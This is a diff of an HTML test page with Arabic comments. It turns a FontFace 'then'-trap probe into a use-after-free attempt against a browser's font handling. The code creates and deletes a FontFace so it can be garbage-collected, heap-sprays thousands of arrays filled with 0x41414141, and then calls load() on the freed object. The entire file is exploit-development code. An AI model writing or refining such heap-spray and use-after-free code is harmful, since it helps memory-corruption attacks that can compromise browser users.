@@ -1,27 +1,31 @@
 <!DOCTYPE html>
 <html>
 <body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
-    <div id="log" style="font-size: 1.2em;"></div>
+    <div id="log">بدء الضغط على الذاكرة...</div>
     <script>
         function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
 
+        // 1. إنشاء كائن فونت وحذفه فوراً
         let A = new FontFace('x', 'local(Arial)', {});
         document.fonts.add(A);
+        document.fonts.delete(A); // حذف الكائن فوراً لجعله مرشحاً للـ GC
+
+        // 2. إرهاق الذاكرة لإجبار المحرك على إعادة استخدام المكان المحرر
+        log("بدء الرش المكثف...");
+        let spray = [];
+        for(let i=0; i<5000; i++) {
+            spray.push(new Uint32Array(0x1000).fill(0x41414141));
+        }
         
-        let probe = new Uint32Array(0x100);
-        probe[0] = 0x12345678;
-
-        Object.defineProperty(FontFace.prototype, 'then', {
-            configurable: true,
-            get() {
-                // طباعة القيمة الحالية للمصفوفة فور الوصول للفخ
-                log("تم اعتراض الوصول! قيمة المصفوفة الحالية هي: " + probe[0].toString(16));
-                return undefined;
-            }
-        });
-
-        log("بدء التحميل...");
-        document.fonts.load('1em x', 'AB');
+        log("الرش اكتمل. جاري محاولة الوصول للذاكرة...");
+        
+        // 3. محاولة الوصول للكائن المحرر (بدون then)
+        try {
+            A.load(); // محاولة تحميل كائن تم حذفه!
+            log("نجاح: تم الوصول للكائن!");
+        } catch(e) {
+            log("فشل: " + e.message);
+        }
     </script>
 </body>
 </html>
